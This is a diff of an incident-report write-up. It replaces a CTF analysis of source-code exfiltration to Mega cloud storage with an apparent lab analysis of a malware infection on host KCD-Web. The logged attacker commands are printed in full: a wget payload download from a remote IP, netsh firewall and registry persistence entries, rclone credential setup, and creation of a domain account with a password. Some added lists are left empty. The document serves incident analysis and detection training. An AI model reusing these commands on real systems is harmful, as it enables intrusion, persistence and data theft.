@@ -1,218 +1,172 @@
-## Report Details:
+**Analyst: YB**
 
-**Title**: MYDFIR CTF #4 – EmberForge Studios: Source Code Exfiltration Investigation
+**Tactics**: `#Execution` `#Persistence` `#Defense_Evasion` `#Command_and_Control`
 
-**Analyst**: YB
+**IDs**: `#TA0002` `#TA0003` `#TA0005` `#TA0011` 
 
-### MITRE ATT&CK:
+**Techniques:** `#Malicious_File` `#Boot_Logon_Autostart` `#Disable_Modify_Firewall #Application_Layer_Protocol_DNS` 
+**IDs:** `#T1204.002` - `#T1547` - `#T1562.004` - `#T1071.004`
 
-- **Tactics:** [#Execution](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Collection](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Exfiltration](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Persistence](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21)
-    - **IDs:** [#TA0002](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#TA0009](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#TA0010](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#TA0003](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21)
-- **Techniques:** [#PowerShell](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Archive_Collected_Data](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Transfer_to_Cloud_Account](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#Create_Domain_Account](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21)
-    - **IDs:** [#T1059](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21).001 [#T1560](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21).001 [#T1537](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21) [#T1136](https://www.notion.so/MYDFIR-CTF-4-35960332707a80388913d2781002832e?pvs=21).002
+**Report:** INC-KCD-001
 
-### Report N: INC-CTF4-001
+## Executive summary
 
----
-
-## Executive Summary
-
-Between **2026-01-30 23:49** and **2026-01-31 00:38**, an attacker operating on the **EmberForge Studios** internal network conducted a targeted data theft operation against the company's unreleased game, **Neon Shadows**. Operating under **SYSTEM-level privileges**, the attacker used PowerShell to compress the entire `C:\\GameDev\\` source directory into an archive and exfiltrated it to **Mega cloud storage** using a pre-configured rclone tool tied to the attacker-controlled account `jwilson.vhr@proton.me`. To ensure continued access, the attacker created a new domain account (`svc_backup`) before concluding the session. The attack was executed in under **49 minutes** across at least two hosts within the `EMBERFORGE` domain. **The source code for Neon Shadows should be considered fully compromised and in the hands of an unknown third party.**
-
----
+Threat hunting on **KCD-Web** on **April 20, 2026** turned up a fully deployed multi-stage malware infection running under **`NT AUTHORITY\\SYSTEM`** privileges. The attack started when a compromised service account (**`ftp$`**) ran a self-extracting dropper called **`HRSword.exe`**, which pulled a secondary payload (**`p2.exe`**) from a remote server at **`82.147.85.6`**. That payload dropped a set of binaries into a disguised system directory (**`C:\\Windows\\Fonts\\init\\`**) and set up two persistence mechanisms via registry edits. The core implant, **`client.exe`**, made 88 outbound connections to **`8.8.8.8`** in one hour, classic C2 beaconing. A registry key named **Peer2Profit** points to a bandwidth-monetization scheme: the attacker routes victim traffic through their own infrastructure to sell access. A masqueraded **`svchost.exe`** also ran a second payload (**`wahiver.exe`**) that connected to external servers. This host is actively compromised and should be treated as fully untrusted.
 
 ## Findings
 
-- **AlertID**: Exfil-Alert #001 (MYDFIR CTF #4)
-- Attack scope: **EmberForge Studios** (`emberforge.local` domain), **Neon Shadows** game source code targeted
-- **SYSTEM-level** (`S-1-5-18`) command execution confirmed on `EC2AMAZ-16V3AU4.emberforge.local`
-- **PowerShell** used to archive `C:\\GameDev\\` into `C:\\Users\\Public\\gamedev.zip` via `Compress-Archive`
-- **Rclone** configured with attacker-controlled **Mega cloud credentials**:
-    - Exfiltration account: `jwilson.vhr@proton.me`
-    - Target endpoint: `bt5.api.mega.co.nz`
-- **Domain persistence account created:**
-    - Username: `svc_backup`
-    - Password: `P@ssw0rd123!`
-    - Added to domain via `net user /add /domain`
-- **Affected Hosts:**
-    - `EC2AMAZ-EEU3IA2.emberforge.local` — primary exfiltration host
-    - `EC2AMAZ-16V3AU4.emberforge.local` — SYSTEM-level execution observed
-- Log sources confirmed:
-    - `MYDFIR_SecurityEvent_CL` (EventID **4103** – PowerShell module logging)
-    - `MYDFIR_DeviceProcessEvents_CL`
+- **AlertID: C2-Beaconing-Alert #001**
 
----
+**`client.exe`** made 88 connections to **`8.8.8.8`** in one hour, confirmed automated C2 beaconing
+Attack chain kicked off via compromised service account **`ftp$`**
+Secondary payload pulled from remote server **`82.147.85.6`** using wget
+Two persistence mechanisms set up: boot execution and Run key registry entries
+Firewall rule (named "Windows Locator") added to allow inbound traffic to client.exe
+Masqueraded **`svchost.exe`** dropped in non-standard path **`C:\\Windows\\fonts\\w\\`** and used to run **`wahiver.exe`**
+wasp.exe created a named pipe mimicking Chrome
+Files dropped by **`p2.exe`** in **`C:\\Windows\\Fonts\\init\\`**:
+Contacted domains include known Russian platforms (**`habrahabr[.]ru`**, **`vk[.]com`**, m**`ail[.]ru`**), likely used to blend C2 traffic with normal browsing
 
-## Investigation Summary
+## Investigation summary
 
-Sentinel telemetry from the `emberforge` lab environment, scoped to **2026-01-29 through 2026-02-02**, reveals a concise but complete attack chain focused on intellectual property theft. The attacker's earliest confirmed footprint is **2026-01-30 23:49:25**, where `conhost.exe` was spawned by `cmd.exe` running under the `SYSTEM` account (`S-1-5-18`) on `EC2AMAZ-16V3AU4.emberforge.local`. The use of SYSTEM context at this early stage indicates the attacker had already achieved full privilege escalation before the observed activity window begins.
+Splunk telemetry from **KCD-Web** showed an active, multi-stage compromise running at the highest privilege level on the system, **`NT AUTHORITY\\SYSTEM`**. The infection timeline spans two separate dates, suggesting the attacker had prior staging access before deploying the main payload.
+The earliest recorded activity **(2026-02-12)** shows **`HRSword.exe`** loading **`urlmon.dll`**, a Windows URL handling library, meaning the malware could already communicate over the network at that stage. A concurrent registry modification at that timestamp suggests early persistence attempts before full deployment.
 
-Approximately **19 minutes later** on `EC2AMAZ-EEU3IA2.emberforge.local`, the attacker issued a PowerShell command to compress the entire `C:\\GameDev\\` directory — which contained the source code for **Neon Shadows**, EmberForge's upcoming cyberpunk RPG — into a zip archive at `C:\\Users\\Public\\gamedev.zip`. Staging the archive in `C:\\Users\\Public\\` is a deliberate choice: this path is world-readable and commonly used by attackers to temporarily stage data before exfiltration without requiring elevated write permissions at the destination.
+The main attack chain executed on **2026-04-08**, starting at 08:51 when the compromised account ftp$ launched HRSword.exe. Within two minutes, **`ftp$`** used wget to pull **`p2.exe`** directly from **`82.147.85.6`**, a remote server hosting the secondary payload behind basic HTTP authentication. **`p2.exe`** then dropped a collection of binaries into **`C:\\Windows\\Fonts\\init\`** -a non-standard path to blend in with legitimate Windows font directories. This directory housed the primary implant, client.exe, along with tools for service installation (**instsrv.exe,** **`srvany.exe`**) and additional unknown payloads (**`1.exe`**, **`2.exe`**).
 
-Four minutes later (**00:12:54**), the attacker wrote a rclone configuration file (`C:\\Users\\Public\\rclone.conf`) containing credentials for the Mega cloud storage account `jwilson.vhr@proton.me`, targeting the endpoint `bt5.api.mega.co.nz`. Rclone is a legitimate open-source cloud sync tool that, in this context, was weaponized to transfer the staged archive to attacker-controlled cloud storage. The use of Mega is notable — Mega's end-to-end encryption makes it difficult for network-layer controls to inspect the transferred content, and the use of a dedicated exfiltration account (`jwilson.vhr@proton.me`) suggests the attacker pre-planned this operation.
+Seconds after the file drops, **`netsh.exe`** created a firewall rule named "**Windows Locator**" to permit inbound connections to **`client.exe`**. Registry entries were written at the same time to ensure client.exe survives both system reboots (via the **`Wininit`** service parameter) and user logins (via a Run key named **Peer2Profit** under the default user hive). The **Peer2Profit** registry key name is a significant finding: **Peer2Profit** is a known bandwidth-monetization platform that routes victim machine traffic through attacker-controlled infrastructure, letting the attacker profit from the compromised host's network resources. This explains the high volume of beaconing activity to **`8.8.8.8`** and the presence of multiple external IP addresses in network logs.
 
-The final observed action (**00:38:11**) was the creation of a new domain account — `svc_backup` with the password `P@ssw0rd123!` — using `net user /add /domain`. This is a classic persistence move: by creating a domain account with a plausible service-account name, the attacker ensures they can re-enter the environment even if the original access vector is remediated.
+Shortly afterward,, a masqueraded **`svchost.exe`** binary placed in **`C:\\Windows\\fonts\\w`** (again mimicking a legitimate path) executed by **`services.exe`** to launch **`wahiver.exe`**. This secondary payload set up its own outbound connections to external infrastructure, suggesting a separate C2 channel or payload stage running in parallel.
+Russian platforms (**`habrahabr[.]ru`**, **`vk[.]com`**, **`mail[.]ru`**) in the domain **IOC** list indicates the attacker may be using legitimate web services as dead-drop C2 channels, a technique designed to blend malicious traffic with normal web browsing patterns and evade domain-based detection.
 
-The entire chain from first SYSTEM execution to persistence account creation spans **49 minutes**, suggesting an attacker who knew exactly what they were after and executed with deliberate efficiency.
+## The 5w - 1h
 
----
+### Who
 
-## The 5W – 1H
+Unknown threat actor using a compromised service account (**`ftp$`**) to operate under **SYSTEM** privileges. Observed domains and external IPs point to Russian-linked infrastructure and tooling, though formal attribution is not confirmed.
 
-- **Who:** An unknown threat actor with pre-established SYSTEM-level access to the `EMBERFORGE` domain. The use of a dedicated Mega exfiltration account (`jwilson.vhr@proton.me`) and pre-configured rclone suggests this was a targeted, planned operation — not opportunistic.
-- **What:** Complete exfiltration of the `C:\\GameDev\\` source directory (Neon Shadows game source code), followed by creation of a domain persistence account (`svc_backup`). The stolen data was transferred to Mega cloud storage under attacker-controlled credentials.
-- **When:** Attack chain observed between **2026-01-30 23:49:25** and **2026-01-31 00:38:11** — approximately **49 minutes** from first footprint to persistence establishment.
-- **Where:** Two hosts within the `EMBERFORGE` domain:
-    - `EC2AMAZ-16V3AU4.emberforge.local` — initial SYSTEM-level execution
-    - `EC2AMAZ-EEU3IA2.emberforge.local` — data collection and exfiltration
-- **Why:** The target was specifically `C:\\GameDev\\` — the source code for **Neon Shadows**, an unreleased game with significant commercial value and an upcoming funding round. The attacker did not appear to broadly explore the environment, focusing exclusively on this high-value directory. The creation of `svc_backup` after exfiltration suggests the attacker intends to return.
-- **How:** SYSTEM-level `cmd.exe` → PowerShell `Compress-Archive` to package `C:\\GameDev\\` → rclone configuration written with Mega credentials → data uploaded to `bt5.api.mega.co.nz` → `net user /add /domain` to establish `svc_backup` for persistent re-entry. The speed and precision of execution, combined with pre-staged tooling (rclone, Mega account), indicate the attacker had pre-planned this operation and likely conducted reconnaissance prior to this window.
+### What
 
----
+A fully staged multi-phase malware deployment, including dropper execution, secondary payload retrieval, binary staging, dual persistence, firewall modification, C2 beaconing, and a second lateral execution chain via masqueraded **`svchost.exe`**.
 
-## Commands (Exact as Logged)
+### When
 
-**Stage 1 – Data collection:**
+Initial loader activity observed **2026-02-12 04:55**. Core attack chain executed **2026-04-08** between **08:51** and **08:54** (approximately 3 minutes for full deployment). C2 beaconing (88 connections in 1 hour) observed post-deployment.
 
-```
-powershell.exe -c Compress-Archive -Path C:\\GameDev -DestinationPath C:\\Users\\Public\\gamedev.zip
-```
+### Where
 
-**Stage 2 – Exfiltration configuration:**
+Host **KCD-Web**, exclusively in **`C:\\Windows\\Fonts\\init\\`** and **`C:\\Windows\\fonts\\w`** -non-standard directories chosen to evade casual path inspection.
+
+### Why
+
+The **Peer2Profit registry key** identifies the primary objective as bandwidth monetization: the attacker profits by selling the victim host's network capacity. Secondary objectives (via wahiver.exe and external connections) may include separate C2 capability for further lateral movement or data collection.
+
+### How
+
+**`ftp$`** account (likely already compromised or a pre-planted service account) executed **`HRSword.exe`** -> **`HRSword.bat`** was called from a self-extracting temp archive ->  **`p2.exe`** downloaded from **`82.147.85.6`** via wget ->  binaries staged in font directory ->  **`netsh.exe`** opened firewall ->  registry persistence written ->  **`client.exe`** began beaconing ->  wasp.exe created a **`Chrome-mimicking`** named pipe ->  masqueraded **`svchost.exe`** executed **`wahiver.exe`** for secondary C2. The compressed execution window (~3 minutes) suggests an automated deployment script.
+
+## Commands & artifacts (exact as logged)
 
 ```
-cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\\Users\\Public\\rclone.conf"
+"C:\\Windows\\System32\\cmd.exe" /c @pushd "C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000" >nul 2>&1 & CALL "C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000\\HRSword.bat"
 ```
 
-**Stage 3 – Domain persistence:**
-
 ```
-net user svc_backup P@ssw0rd123! /add /domain
+wget <http://1:1@82.147.85.6/p2.exe> -O C:\\Windows\\p2.exe
 ```
 
-**SYSTEM process chain:**
-
 ```
-ProcessCommandLine: \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1
-InitiatingProcessFileName: C:\\Windows\\System32\\cmd.exe
+netsh advfirewall firewall add rule name="Windows Locator" dir=in action=allow program="C:\\windows\\fonts\\init\\client.exe" enable=yes
 ```
 
----
-
-## Attack Timeline
-
-|Timestamp (UTC)|Host|Activity|Source|
-|---|---|---|---|
-|`2026-01-30 23:49:25`|`EC2AMAZ-16V3AU4.emberforge.local`|`conhost.exe` spawned by `cmd.exe` under SYSTEM (S-1-5-18)|`MYDFIR_DeviceProcessEvents_CL`|
-|`2026-01-31 00:08:28`|`EC2AMAZ-EEU3IA2.emberforge.local`|PowerShell compressed `C:\\GameDev` → `C:\\Users\\Public\\gamedev.zip`|`MYDFIR_SecurityEvent_CL` (EventID 4103)|
-|`2026-01-31 00:12:54`|`EC2AMAZ-EEU3IA2.emberforge.local`|Rclone config written with Mega account credentials targeting `bt5.api.mega.co.nz`|`MYDFIR_SecurityEvent_CL` (EventID 4103)|
-|`2026-01-31 00:38:11`|`EC2AMAZ-EEU3IA2.emberforge.local`|Domain user `svc_backup` created with `P@ssw0rd123!` for persistent access|`MYDFIR_DeviceProcessEvents_CL`|
-
----
-
-## Detection Query (KQL)
-
-**Compress-Archive activity via PowerShell (EventID 4103):**
-
 ```
-MYDFIR_SecurityEvent_CL
-| where Lab == "emberforge"
-| where Timestamp between (datetime(2026-01-29 12:11:00) .. datetime(2026-02-02))
-| where EventID == 4103
-| extend x = parse_xml(EventData)
-| extend ContextInfo = tostring(x.Event.EventData.Data[0]["#text"])
-| where ContextInfo has "Compress-Archive"
-| project Timestamp, Computer, EventID, ContextInfo, EventData
-| sort by Timestamp asc
+Path: HKLM\\System\\CurrentControlSet\\Services\\Wininit\\Parameters\\Application
+Value: C:\\windows\\fonts\\init\\client.exe
 ```
 
----
-
-## Indicators of Compromise
-
-### Accounts
-
 ```
-svc_backup                  (domain persistence account — created by attacker)
-jwilson.vhr@proton.me       (attacker-controlled Mega exfiltration account)
+Path: HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Peer2Profit
+Value: "C:\\windows\\fonts\\init\\client.exe" --minimize
 ```
 
-### Exfiltration Infrastructure
-
 ```
-bt5.api.mega.co.nz          (Mega cloud storage — exfiltration destination)
+C:\\Windows\\fonts\\w\\svchost.exe run
 ```
 
-### Files & Paths
+## Indicators of compromise
+
+### Malicious files
 
 ```
-C:\\Users\\Public\\gamedev.zip     (compressed source code archive — staged for exfiltration)
-C:\\Users\\Public\\rclone.conf     (rclone config containing attacker Mega credentials)
-C:\\GameDev\\                     (exfiltrated source directory — Neon Shadows)
+HRSword.exe, HRSword.bat, ServiceE.exe, wahiver.exe, client.exe, p2.exe, wasp.exe, 1.exe, 2.exe, go.bat, instsrv.exe, srvany.exe
 ```
 
-### Compromised Hosts
+### Malicious paths
 
 ```
-EC2AMAZ-EEU3IA2.emberforge.local
-EC2AMAZ-16V3AU4.emberforge.local
+C:\\Windows\\Fonts\\init\\
+C:\\Windows\\fonts\\w\\
+C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000\\
+C:\\Windows\\p2.exe
 ```
 
-### Process Context
+### Ip addresses
 
 ```
-AccountSid:    S-1-5-18        (SYSTEM)
-AccountDomain: EMBERFORGE
-AccountName:   EC2AMAZ-16V3AU4$
-LogonId:       0x3e7
+82.147.85.6 (payload download server)
+178.248.233.33
+185.180.201.1
+185.213.157.164
+87.240.129.133
+87.240.132.67
+87.240.132.72
+87.240.132.78
+87.240.137.164
+89.221.239.1
+90.156.232.4
+8.8.8.8 (C2 beacon destination)
 ```
 
-### Raw Event Identifiers
+### Domains
 
 ```
-DeviceId:      8316098e3fa89a887a05c05525971225c0ad8ca5
-ReportId:      167659
-SourceSystem:  Splunk
-Type:          MYDFIR_DeviceProcessEvents_CL
+testdomainlocalsecololoalala234nhv[.]wtd
+habrahabr[.]ru
+node0[.]waspace[.]net
+mail[.]ru
+vk[.]com
 ```
 
----
+### Named pipe
 
-## MITRE ATT&CK Mapping
+```
+\\chrome.4964.2.205802953
+```
 
-|Technique ID|Name|
-|---|---|
-|T1059.001|Command and Scripting Interpreter: PowerShell|
-|T1560.001|Archive Collected Data: Archive via Utility|
-|T1537|Transfer Data to Cloud Account|
-|T1136.002|Create Account: Domain Account|
+### Account
 
----
+```
+ftp$
+```
 
 ## Recommendations
 
-### Immediate Response
+### Immediate response
 
-- **Disable `svc_backup`** immediately and audit all recently created domain accounts — assume the account may have already been used for re-entry
-- **Rotate all credentials** on `EC2AMAZ-EEU3IA2` and `EC2AMAZ-16V3AU4` — SYSTEM-level access was confirmed and the initial access vector is not yet identified
-- **Delete staged files** — `C:\\Users\\Public\\gamedev.zip` and `C:\\Users\\Public\\rclone.conf`
-- **Block outbound access to `bt5.api.mega.co.nz`** and Mega infrastructure at the perimeter; verify whether the upload completed
-- **Notify legal and leadership** — source code for Neon Shadows is likely in the hands of a third party; this may constitute a data breach requiring notification depending on jurisdiction
+Isolate **KCD-Web** from the network immediately -the host is actively beaconing and must be treated as fully compromised.
+Disable and audit the **`ftp$`** account -determine how credentials were obtained and whether other systems are at risk.
+Remove the firewall rule "**Windows Locator**" and block outbound traffic to all listed IPs at the perimeter firewall.
+Delete malicious files from **`C:\\Windows\\Fonts\\init\\`** and **`C:\\Windows\\fonts\\w\\`** and purge associated registry keys.
 
-### Detection & Hardening
+### Detection & hardening
 
-- Implement alerting for:
-    - `Compress-Archive` or `zip` operations targeting source code directories
-    - Rclone, MEGAsync, or other cloud sync tool execution from non-standard paths
-    - `net user /add /domain` executed outside approved change windows
-    - `C:\\Users\\Public\\` used as a staging directory for large files
-    - New domain accounts created outside of IT provisioning workflows
-- Enforce **PowerShell Constrained Language Mode** and script block logging across the domain
-- Review and restrict which accounts can execute PowerShell and run net commands with domain-level flags
+Implement monitoring for:
+Enforce least privilege on service accounts **`-ftp$`** should not have the ability to execute binaries or make outbound web requests.
+Review all service accounts for signs of prior compromise.
 
-### References
+## References
 
-- [**MITRE ATT&CK T1537**](https://attack.mitre.org/techniques/T1537/) – Transfer Data to Cloud Account
-- [**MITRE ATT&CK T1560.001**](https://attack.mitre.org/techniques/T1560/001/) – Archive Collected Data: Archive via Utility
-- [**MITRE ATT&CK T1136.002**](https://attack.mitre.org/techniques/T1136/002/) – Create Account: Domain Account
-- [**NIST SP 800-53 Rev 5 – AC-2**](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-53r5.pdf): Account Management
+- **MITRE ATT&CK T1547** - Boot or Logon Autostart Execution
+- **MITRE ATT&CK T1562.004** - Impair Defenses: Disable or Modify System Firewall
+- **MITRE ATT&CK T1071.004** - Application Layer Protocol: DNS
+- **Peer2Profit** - **Proxyware Overview** - Background on bandwidth-monetization malware
